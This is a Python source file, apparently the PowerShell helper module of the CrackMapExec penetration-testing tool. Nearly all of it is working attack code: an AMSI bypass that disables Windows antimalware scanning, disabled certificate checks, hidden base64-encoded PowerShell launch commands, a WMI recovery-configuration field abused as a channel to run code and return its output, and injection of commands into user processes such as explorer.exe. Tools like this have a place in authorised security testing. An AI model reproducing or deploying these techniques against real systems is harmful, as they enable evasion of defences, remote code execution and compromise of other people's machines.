import cme
import os
import logging
import re
import zlib
import base64
from cme.logger import CMEAdapter

logger = CMEAdapter()


def get_ps_script(path):
    return os.path.join(os.path.dirname(cme.__file__), 'data', path)


def ps_decode_and_inflate(command):
    """
    https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations
    """
    decoded_data = base64.b64decode(command)
    return zlib.decompress(decoded_data, -15)


def ps_deflate_and_encode(command):
    """
    https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations
    """
    zlibbed_str = zlib.compress(command)
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode(compressed_string)


def encode_ps_command(command):
    return base64.b64encode(command.encode('UTF-16LE'))


def strip_ps_code(code):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.
    """

    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', code)
    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([
        line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))
    ])

    return strippedCode


def obfs_ps_script(path_to_script):
    with open(get_ps_script(path_to_script), 'r') as script:
        return strip_ps_code(script.read())


def create_ps_command(output=True, force_ps32=False):
    compress_function = """
function Invoke-Compress
{
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [string]
        $Data
    )

    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($Data)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    return $EncodedCompressedScript
}
"""

    decompress_function = """
function Invoke-Decompress
{
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [string]
        $Data
    )

    $B64Data = [IO.MemoryStream][Convert]::FromBase64String($Data.Trim())
    $Deflated = New-Object IO.Compression.DeflateStream($B64Data, [IO.Compression.CompressionMode]::Decompress)
    $Stream = New-Object IO.StreamReader($Deflated, [Text.Encoding]::ASCII)

    return $Stream.ReadToEnd()
}
"""

    command_with_output = """
$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration
$out = IEX (Invoke-Decompress -Data $a.DebugFilePath) | Out-String
$a.DebugFilePath = Invoke-Compress -Data $out.Trim()
$a.Put()
"""

    command_without_output = """
$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration
IEX (Invoke-Decompress -Data $a.DebugFilePath)
"""

    if output:
        ps = compress_function + '\n' + decompress_function + '\n' + command_with_output
    else:
        ps = decompress_function + '\n' + command_without_output

    logging.debug("Generated PS command:\n {} \n".format(ps))

    if force_ps32:
        command = "C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -noni -nop -w 1 -enc {}".format(encode_ps_command(strip_ps_code(ps)))
    else:
        command = "powershell.exe -noni -nop -w 1 -enc {}".format(encode_ps_command(strip_ps_code(ps)))

    return command


def create_ps_payload(payload):

    preamble = """try{
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}catch{}
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
"""

    command = preamble + strip_ps_code(payload)

    logging.debug('Generated PS payload:\n {}...\n\n...{} \n'.format(command[:300], command[-300:]))

    #with open('last_command.debug', 'w') as last:
    #    last.write(command)

    return command


def gen_ps_inject(command, procname='explorer.exe', inject_once=False):
    """
    The following code gives us some control over where and how Invoke-PSInject does its thang
    It prioritizes injecting into a process of the active console session
    """

    ps_code = '''
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
'''.format(inject_once='$True' if inject_once else '$False', command=encode_ps_command(command), procname=procname)

    return ps_code
